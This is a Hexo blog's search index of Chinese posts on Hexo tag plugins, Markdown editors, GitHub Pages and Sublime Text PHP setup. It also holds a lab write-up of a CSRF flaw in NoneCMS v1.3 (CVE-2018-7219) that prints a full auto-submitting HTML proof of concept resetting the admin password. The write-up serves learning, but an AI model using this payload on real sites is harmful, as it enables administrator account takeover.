<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% tabs [Unique name], [index] %&#125;</span><br><span class="line">  &lt;!-- tab [Tab caption]@[icon] --&gt;</span><br><span class="line">  标签页内容（支持行内标签）</span><br><span class="line">  &lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure>

<p>其中各参数含义如下：</p>
<ul>
<li>Unique name: 全局唯一的 Tab 名称，将作为各个标签页的 id 属性前缀</li>
<li>index: 当前激活的标签页索引，如果未定义则默认选中显示第一个标签页，如果设为 -1 则默认隐藏所有标签页</li>
<li>Tab caption: 当前标签页的标题，如果不指定则会以 Unique name 加上索引作为标题</li>
<li>icon: 在标签页标题中添加 FontAwesome 图标</li>
</ul>
<p>使用示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% tabs Example , 2 %&#125;</span><br><span class="line">&lt;!-- tab  @fab fa-github --&gt;</span><br><span class="line">**This is Tab 1.**</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab Solution 2 --&gt;</span><br><span class="line">**This is Tab 2.**</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab Solution 3 @paw --&gt;</span><br><span class="line">**This is Tab 3.**</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure>

<div class="tabs" id="example-"><ul class="nav-tabs"><li class="tab"><a href="#example--1"><i class="fab fa-github"></i></a></li><li class="tab active"><a href="#example--2">Solution 2</a></li><li class="tab"><a href="#example--3"><i class="fa fa-paw"></i>Solution 3</a></li></ul><div class="tab-content"><div class="tab-pane" id="example--1"><p><strong>This is Tab 1.</strong></p></div><div class="tab-pane active" id="example--2"><p><strong>This is Tab 2.</strong></p></div><div class="tab-pane" id="example--3"><p><strong>This is Tab 3.</strong></p></div></div></div>

<h3 id="video-标签"><a href="#video-标签" class="headerlink" title="video 标签"></a>video 标签</h3><p>我们还可以在网页中插入 video ，语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% video [url] %&#125;</span><br></pre></td></tr></table></figure>

<h3 id="突破容器限制宽度的图片"><a href="#突破容器限制宽度的图片" class="headerlink" title="突破容器限制宽度的图片"></a>突破容器限制宽度的图片</h3><p>当使用此标签引用图片时，图片将自动扩大 26% ，并突破文章容器的宽度。此标签使用于需要突出显示的图片, 图片的扩大与容器的偏差从视觉上提升图片的吸引力。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># HTML方式:</span><br><span class="line">&lt;img src=&quot;[imageurl]&quot; class=&quot;full-image&quot; /&gt;</span><br><span class="line"></span><br><span class="line"># 标签 方式</span><br><span class="line">&#123;% fullimage [image-url], [alt], [title] %&#125;</span><br></pre></td></tr></table></figure>

<h3 id="引用站内链接"><a href="#引用站内链接" class="headerlink" title="引用站内链接"></a>引用站内链接</h3><p>我们还可以通过如下语法引入站内文章的地址或链接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% [post_path] [slug] %&#125;</span><br><span class="line">&#123;% [post_link] [slug] [title] %&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>slug：表示 _post 目录下的 Markdown 文件名</li>
<li>post_path：将会渲染为文章的地址，即 permalink</li>
<li>post_link：将会渲染为链接</li>
<li>title：指定链接标题</li>
</ul>
<p>如以下标签将会生成 <code>/_posts/My-First-Blog.html</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% post_path My-First-Blog %&#125;</span><br></pre></td></tr></table></figure>

<p>而以下标签则会生成 <a href="/2021/07/31/My-First-Blog/" title="MyFirstBlog">MyFirstBlog</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% post_link My-First-Blog MyFirstBlog %&#125;</span><br></pre></td></tr></table></figure>

<p>这种站内引用方式比直接使用 url 引用的形式更为可靠，因为即使修改了 <code>permalink</code> 格式，或者修改了文章的路由地址，只要 Markdown 文件名没有发生改变，引用链接都不会失效。</p>
<h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p>若要在网页中添加流程图，可使用 <code>mermaid</code> 标签来描述：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% mermaid type%&#125;</span><br><span class="line">流程图内容</span><br><span class="line">&#123;% endmermaid %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Markdown-写作工具"><a href="#Markdown-写作工具" class="headerlink" title="Markdown 写作工具"></a>Markdown 写作工具</h2><blockquote>
<p>Sublime Text3</p>
</blockquote>
<p>Sublime Text 是一款流行的代码编辑器软件，也是 HTML 和散文先进的文本编辑器，可运行在 Linux ， Windows 和 Mac OS X 。也是许多程序员喜欢使用的一款文本编辑器软件。</p>
<p>经同学推荐在学习PHP的时候爱上了这款编辑器，除了python语言会使用PyCharm平时全都用的Sublime Text3，它包含丰富插件，可以作为文档编辑器，同时支持 Markdown 语法，搭配 Markdown Editing 和 MarkdownLivePreview 插件可进一步方便我们 Markdown 写作并在线预览。</p>
<p><img src="/images/SublimeText3.png" alt="Sublime Text3 界面"></p>
<blockquote>
<p>Typora</p>
</blockquote>
<p>Typora 是我新发现的一款md文件编辑器，可以为我们提供作为读者和作者的无缝体验，它删除了预览窗口、模式切换器、markdown 源代码的语法符号以及所有其他不必要的干扰，转而提供了真正的实时预览功能，可帮助我们专注于内容本身。</p>
<p>其默认显示预览效果，可选择显示为 <code>源代码模式</code> 查看Markdown 语法下的源代码方便我们编辑。</p>
<p><img src="/images/Typora.png" alt="Typora 界面"></p>
<blockquote>
<p>Mweb</p>
</blockquote>
<p>MWeb 是 Mac 平台上一款专业的 Markdown 写作、记笔记、静态博客生成软件，支持图片上传。他的与众不同在于，除了具备一般 Markdown 编辑器所具有的一切基本功能之外，还具备以下特性：</p>
<ul>
<li>使用原生的 macOS 技术打造，追求与系统的完美结合</li>
<li>支持 LaTeX 公式、 TOC 、表格插入 、代码块、任务列表、脚注等</li>
<li>支持截图并粘贴、复制并粘贴、拖拽等方式插入图片并直接显示在编辑器内</li>
<li>支持丰富的画图库，如 mermaid、echarts、plantuml、流程图、时序图等</li>
<li>支持图片上传服务（图床，如 Google Photos、Imgur、七牛云、又拍云和自定义的图床服务</li>
<li>支持导出为图片、HTML、Epub、PDF、RTF、Docx</li>
<li>支持一键发布到各大博客平台和笔记软件中，拥有及其强大的发布功能</li>
</ul>
<p>这款是最初发表博客时发现的，可以在 Mac Apple Store 花费 ¥128 购买，iPad倒是下载了感观来说瞧着不错的样子但平时都使用电脑在进行操作。</p>
<p><img src="/images/MWeb.png" alt="MWeb 界面"></p>
<blockquote>
<p>One Markdown</p>
</blockquote>
<p>One Markdown 是一款简单快速的，支持纯文本、Markdown 和 Textbundle 的编辑器，它有以下的特色：</p>
<ul>
<li>完整支持 CommonMark 标准和 GitHub Flavored Markdown (GFM)</li>
<li>语法高亮和解析成 HTML 用的都是同一个基础库</li>
<li>采用了 WKWebView，可以边编辑边预览</li>
<li>支持编辑器内显示图片，不但支持本地图片，也支持显示网络图片了，并且还支持 svg、webP、HEIC 等格式</li>
<li>支持创建和编辑 Textbundle 文档</li>
<li>支持数学公式、Echarts、mermaid</li>
</ul>
<p>搜索 Mweb 时发现的，都是由 ou lvhai 开发的，轻量级的选择是 One Markdown，功能完善且强大的选择是 MWeb 。</p>
<p><img src="/images/OneMarkdown.png" alt="One Markdown 界面"></p>
<blockquote>
<p><a href="https://dillinger.io/">Dillinger</a></p>
</blockquote>
<p>Dillinger 是一款支持云的、移动就绪的、兼容离线存储的、<br>AngularJS 驱动的在线 HTML5 Markdown 编辑器，界面简洁，可在线实时预览。</p>
<p><img src="/images/Dillinger.png" alt="Dillinger 界面"></p>
<hr>
<h4> 参考链接   </h4>

<ol>
<li><a href="https://theme-next.iissnan.com/getting-started.html">开始使用 - NexT 使用文档</a></li>
<li><a href="http://yearito.cn/posts/hexo-writing-skills.html">Hexo 搭建个人博客系列：写作技巧篇 - Yearito’s Blog</a></li>
<li><a href="https://wilenwu.github.io/posts/hexo/Hexo-tag-plugins.html">Hexo 标签插件的使用 - Wilen’s Blog</a></li>
<li><a href="https://blog.csdn.net/weixin_34348805/article/details/91389277">在Hexo博客中插入图片 - CSDN博客</a></li>
</ol>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Blog</tag>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>My First Blog</title>
    <url>/2021/07/31/My-First-Blog/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>使用github pages服务搭建博客的好处有：</p>
<ol>
<li>全是静态文件，访问速度快；</li>
<li>免费方便，不用花一分钱就可以搭建一个自由的个人博客，不需要服务器不需要后台；</li>
<li>可以随意绑定自己的域名，不仔细看的话根本看不出来你的网站是基于github的；</li>
<li>数据绝对安全，基于github的版本管理，想恢复到哪个历史版本都行；</li>
<li>博客内容可以轻松打包、转移、发布到其它平台；</li>
</ol>
<p><img src="https://github.com/xinkjung/Photos/raw/master/xhr.jpg" alt="xhr"></p>
<span id="more"></span>


<h1 id="My-First-Blog–搭建过程"><a href="#My-First-Blog–搭建过程" class="headerlink" title="My First Blog–搭建过程"></a>My First Blog–搭建过程</h1><blockquote>
<p>准备</p>
</blockquote>
<ul>
<li>Node.js ： <a href="https://nodejs.org/en/%22%E5%AE%98%E7%BD%91%22">官网</a> 下载最新版本，默认安装即可</li>
<li>Git ：可通过 <a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/00137396287703354d8c6c01c904c7d9ff056ae23da865a000">Git安装教程</a> 对于不同系统进行操作，也是默认安装即可</li>
<li>Hexo ： <a href="https://hexo.io/zh-cn/docs/index.html">Hexo官网</a> ，有详细配置操作</li>
<li>Github ： 没有就注册一个账号</li>
</ul>
<blockquote>
<p>本地设置初始化</p>
</blockquote>
<p>在你新建立文件夹下（如Blog），右键任意位置，选择 Git Bash Here，出现如下界面<br><img src="https://github.com/xinkjung/Photos/raw/master/GitBashHere.jpg" alt="GBH"></p>
<p>此时进行初始化操作，首先执行“hexo init”命令   </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ hexo init</span><br></pre></td></tr></table></figure>

<p> 并执行如下命令，安装 npm</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ npm install -g hexo</span><br></pre></td></tr></table></figure>

<p>然后进行生成预览及上传一系列操作：</p>
<pre><code>$ hexo g # == hexo generate 生成
$ hexo s # == hexo server 本地预览
$ hexo d # == hexo deploy 上传 
</code></pre>
<p>在浏览器中打开网址 <a href="https://localhost:4000/">https://localhost:4000</a> ，显示如下画面，就OK啦！（它已经自动写好了一篇Hello World的文章）<br><img src="https://github.com/xinkjung/Photos/raw/master/Hexo.jpg" alt="Hexo"></p>
<blockquote>
<p>绑定Github</p>
</blockquote>
<p>   首先创建一个名为 ‘你的用户名.github.io’的仓库，以后你的博客访问地址就是 https://你的用户名.github.io</p>
<p>然后可以绑定域名，我没进行这个操作就省略了哈。</p>
<p>下面就要配置SSH Key了<br>同上，一样的在你的根目录（我的是Blog）下使用Git Bash执行命令 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd ~/. ssh #这个命令用于检测本机已存在的SSH key</span><br></pre></td></tr></table></figure>

<p>若提示：No such file or directory 说明你是第一次使用git。</p>
<p>然后再输入命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C &quot;你的邮件地址&quot;</span><br></pre></td></tr></table></figure>

<p>连续三次回车，会生成一个名为 ‘.ssh\id_rsa.pub’ 的文件在你的用户目录下。找到此文件，记事本打开并复制里面内容，再进入你的Github主页，找到个人设置下的SSH and GPG keys -&gt; New SSH key， 把刚才复制的内容粘贴到key那里，title随便填，保存。<br>（这时你应该会收到一个邮件）</p>
<p>但是还不确定是否配置成功对吧，那我们现在来测试一下</p>
<p>同样的，在Git Bash 中输入命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ssh -T git@github.com  ##注意此处不用更改邮箱地址</span><br></pre></td></tr></table></figure>

<p>如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会出现如下字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hi 你的用户名! You’ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure>

<p>就表示你的SSH key已经配置成功啦！！！</p>
<p>然后还要配置文件_config.yml中的deploy部分，用记事本打开该文件（Blog根目录下），修改如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:你的用户名/你的用户名.github.io.git</span><br><span class="line">  branch: hexo          # 这里建议不要存放于主分支master下，这是我的子分支hexo</span><br></pre></td></tr></table></figure>

<p>保存退出，再在Git Bash下执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>这时，再输入 hexo d，就会将本次有改动的代码全部提交，没有改动的不会。<br>命令执行成功后，浏览器中打开网址 https://你的用户名.github.io 就会看到和刚才打开 <a href="https://localhost:4000/">https://localhost:4000</a> 一样的页面，博客就搭建好啦！！！</p>
<blockquote>
<p>注意保留CNAME、README.md等文件</p>
</blockquote>
<p>提交之后网页可能打不开，这是因为代码仓库中少了一个名为CNAME的文件，手动添加一个文件再刷新几次就能打开了。（必须为命名为 ‘CNAME’，内容为你的网站域名,如：xinkjung.github.io）</p>
<p>为了避免此类现象，一些非md文件可以把它们放到根目录的source文件夹下，这里的所有文件都会原样复制（除了md文件）到public目录的，由于hexo默认会把所有md文件都转换成html，包括README.md，所有需要每次生成之后、上传之前，手动将README.md复制到public目录，并删除README.html。</p>
<p>其他参考<br><a href="http://www.cnblogs.com/MuYunyun/p/5927491.html">http://www.cnblogs.com/MuYunyun/p/5927491.html</a><br><a href="http://blog.haoji.me/build-blog-website-by-hexo-github.html?from=xa">http://blog.haoji.me/build-blog-website-by-hexo-github.html?from=xa</a></p>
<blockquote>
<p>插入图片</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">代码格式如下：  ![图片说明](./img/图片名.jpg...url)</span><br></pre></td></tr></table></figure>

<p> 图片保存于source文件夹的img目录内，不过这个好像无法显示图片</p>
<p> 推荐最好上传到仓库里，直接使用网页链接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">github 图片链接格式：(http://github.com/yourname/your-repository/raw/master/images-folder/xxx.png)</span><br><span class="line">要自己设定的：yourname, your-repository, your-folder, xxx.png。    </span><br><span class="line">yourname            --- 你的帐号    </span><br><span class="line">your-respository    --- 你的 project 名    </span><br><span class="line">images-folder       --- 你存放图片的文件夹，如果是直接放在 project 的项目根目录的話，就可以省略這個    </span><br><span class="line">xxx.png             --- 你的图片名</span><br></pre></td></tr></table></figure>

<p>然后在**.md文件里添加，例如：我的存在于项目Photos根目录下<br><img src="https://github.com/xinkjung/Photos/raw/master/IMG_0019.JPG" alt="hhh"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![hhh](https://github.com/xinkjung/Photos/raw/master/IMG_0019.JPG)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>插入超链接</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">代码格式如下：  [网页链接说明](https://..... url)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Blog</tag>
        <tag>GitHub</tag>
      </tags>
  </entry>
  <entry>
    <title>Nonecms v1.3后台CSRF漏洞(CVE-2018-7219)</title>
    <url>/2021/08/01/Nonecms%20v1.3%E5%90%8E%E5%8F%B0CSRF%E6%BC%8F%E6%B4%9E(CVE-2018-7219)/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>此次实践只是为了学习知识，巩固一下网络攻防，增强动手能力。</p>
<span id="more"></span>


<p>这次实验很简单（PHP等其他环境搭建好的条件下），在NoneCms官网找到下载链接，按照提示安装即可。</p>
<p>以修改管理员密码为例，来说明漏洞详情：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">        $params = input(&#x27;post.&#x27;);</span><br><span class="line">            $data = [</span><br><span class="line">                &#x27;username&#x27; =&gt; $params[&#x27;user_name&#x27;],</span><br><span class="line">                &#x27;password&#x27; =&gt;  $params[&#x27;password&#x27;],</span><br><span class="line">                &#x27;email&#x27; =&gt; $params[&#x27;email&#x27;],</span><br><span class="line">                &#x27;islock&#x27; =&gt; $params[&#x27;islock&#x27;],</span><br><span class="line">                &#x27;repassword&#x27; =&gt; $params[&#x27;repassword&#x27;]</span><br><span class="line">            ];</span><br><span class="line">---------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">     /**</span><br><span class="line">     * 修改用户信息</span><br><span class="line">     */</span><br><span class="line">    public function edit($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $data = Db::name(&#x27;admin&#x27;)-&gt;find($id);</span><br><span class="line">        $this-&gt;assign(&#x27;data&#x27;, $data);</span><br><span class="line">        return $this-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>根据代码（application/admin/controller/Admin.php ）可以发现，由于没有加入token只需要输入新密码即可，因此这里存在着CSRF漏洞。</p>
<p>我们首先记录管理员初始密码的md5值，方便后面对比<br><img src="/imges/Nonecms/nonecms1.PNG" alt="nonecms1"></p>
<p>抓包查看参数，发现并没有token参数限制，并且不需要我们输入旧密码，所以直接CSRF即可~<br><img src="/imges/Nonecms/nonecms4.png" alt="nonecms4"></p>
<p>于是我们制作一个恶意网页，诱导管理员点击该网页，便可达到修改管理员的目的。<br><img src="/imges/Nonecms/nonecms3_crsf.PNG" alt="nonecms3_csrf"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/public/index.php/admin/admin/edit.html&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;nonecms&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;repassword&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;role&amp;#95;id&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;islock&quot; value=&quot;0&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;1&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;docuemnt.form[0].submit();&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>这时再查看数据库发现后台管理员密码已被修改！<br><img src="/imges/Nonecms/nonecms2.PNG" alt="nonecms2"></p>
<p>同样的，我们也可以利用CSRF请求来新添一位管理员用户</p>
<p>到此，此次实验完成！！！<br><img src="https://github.com/xinkjung/Photos/raw/master/IMG_2872.GIF" alt="happy"></p>
<p>参考链接<br><a href="http://foreversong.cn/archives/1081">http://foreversong.cn/archives/1081</a></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Sublime text3配置PHP</title>
    <url>/2021/08/01/Sublime-text3%E9%85%8D%E7%BD%AEPHP/</url>
    <content><![CDATA[<h1 id="sublime-text3配置PHP环境"><a href="#sublime-text3配置PHP环境" class="headerlink" title="sublime text3配置PHP环境"></a>sublime text3配置PHP环境</h1><blockquote>
<p>准备</p>
</blockquote>
<ul>
<li>Sublime text 3: 可以直接到<a href="http://www.sublimetext.com/">Sublime text3官网</a>下载适合自己电脑的版本安装即可</li>
<li>PHP: 也是到<a href="http://www.phpstudy.net/">phpstudy官网</a>下载安装即可</li>
</ul>
<span id="more"></span>

<blockquote>
<p>PHP安装</p>
</blockquote>
<p>下面进行PHP 环境变量 配置:</p>
<p>安装好phpstudy后，进入其根目录，找到php这个文件夹会发现里面有各种版本的php，随便选择一个版本你使用就 。</p>
<p>右键我的电脑-&gt;属性-高级系统设置-&gt;高级。找到环境变量，点击</p>
<ol>
<li>编辑用户变量的Path，添加你刚刚选择php版本的路径，保存</li>
<li>编辑系统变量的Path，也是一样的做法，添加php存储 并保存</li>
</ol>
<p><img src="https://github.com/xinkjung/Photos/raw/master/yhpath.jpg" alt="用户"><br><img src="https://github.com/xinkjung/Photos/raw/master/xtpath.jpg" alt="系统"></p>
<p>然后”win+R”输入cmd，进入命令提示符窗口，输入php -v ，会显示你的php版本信息，就表示配置完成了哦！！<br>（输入php -h命令也会显示相关信息）<br><img src="https://github.com/xinkjung/Photos/raw/master/php-v.jpg" alt="cmd"></p>
<blockquote>
<p>sublime text3配置PHP编译系统</p>
</blockquote>
<p>打开软件，菜单栏找到Tools-&gt;Build System-&gt;New Build System.<br>这时会弹出如下文件显示代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;shell_cmd&quot;: &quot;make&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改代码为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;     </span><br><span class="line">	 &quot;cmd&quot;: [&quot;php&quot;, &quot;$file&quot;], </span><br><span class="line">     &quot;file_regex&quot;: &quot;php$&quot;,</span><br><span class="line">     &quot;selector&quot;: &quot;source.php&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后保存在默认路径下，并修改文件名为php.sublime-build，到此就OK啦！！！<br>重启sublime text3，随便输入php代码，再按”ctrl+B”就可以编译了。</p>
<p><img src="https://github.com/xinkjung/Photos/raw/master/helloworld.jpg" alt="php-hw"><br><img src="https://github.com/xinkjung/Photos/raw/master/hw-result.jpg" alt="php-result"></p>
<h1 id="Sublime-text3配置浏览器预览"><a href="#Sublime-text3配置浏览器预览" class="headerlink" title="Sublime text3配置浏览器预览"></a>Sublime text3配置浏览器预览</h1><blockquote>
<p>准备</p>
</blockquote>
<ul>
<li>SideBarEnhancements插件： 这是一款侧边栏增强插件，<br>“ctrl+shift+p”打开快速菜单栏，输入”pcip”，选择”install packages”回车，在搜索框内查找该插件并下载。</li>
</ul>
<blockquote>
<p>配置相关文件</p>
</blockquote>
<p>  首先为插件指定默认浏览器，打开 “ Preference -&gt; Package Settings -&gt; Side Bar -&gt; Settings-User”,在打开的文件中输入以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">  &quot;default_browser&quot;: &quot;firefox&quot; //one of this list: firefox, aurora, chrome, canary, chromium, opera, safari</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>默认浏览器可以是列表任一，我选用的是火狐Firefox</p>
<p>然后为插件指定默认localhost目录，在侧边栏任意文档上右键，选择”Project -&gt; Edit Preview URLs”,在文件中添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;F:/PHP/text/&quot;:&#123;</span><br><span class="line">        &quot;url_testing&quot;: &quot;http://localhost:81/&quot;,</span><br><span class="line">        &quot;url_production&quot;: &quot;http://xinkjung.com/&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 1.”F:/PHP/text/“： 是文件在磁盘中的路径</p>
<p> 2.”url_testing”: 本地localhost路径，请根据个人情况修改</p>
<p> 3.”url_production”：项目线上地址（好像可以随便填）</p>
<p> 接下来最后一步，为浏览器绑定热键，打开”Preference -&gt; Package Settings -&gt; Side Bar -&gt; key Bindings-User”，在打开的文件中添加以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;keys&quot;: [&quot;ctrl++shift+f1&quot;],</span><br><span class="line">        &quot;command&quot;: &quot;side_bar_open_in_browser&quot;,</span><br><span class="line">        &quot;args&quot;: &#123;</span><br><span class="line">                    &quot;paths&quot;: [],</span><br><span class="line">                    &quot;type&quot;: &quot;testing&quot;,</span><br><span class="line">                    &quot;browser&quot;: &quot;firefox&quot;</span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>我使用的是”ctrl+shift+f1”，可视个人习惯而定，浏览器我选用Firefox。</p>
<p>到此，所有就设置好啦，在页面中按相应热键，选择文件就能在设置的浏览器中浏览啦！！！</p>
<ul>
<li>注：一定要打开phpstudy,且文件放置在WWW目录下才可实现哦~</li>
</ul>
<p>附上参考链接：<br>1、<a href="https://jingyan.baidu.com/article/15622f2419ce79fdfcbea5ea.html">https://jingyan.baidu.com/article/15622f2419ce79fdfcbea5ea.html</a></p>
<p>2、<a href="https://jingyan.baidu.com/article/09ea3ede04ebe9c0aede390d.html">https://jingyan.baidu.com/article/09ea3ede04ebe9c0aede390d.html</a></p>
]]></content>
      <categories>
        <category>配置</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Sublime text3</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2021/07/26/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
</search>
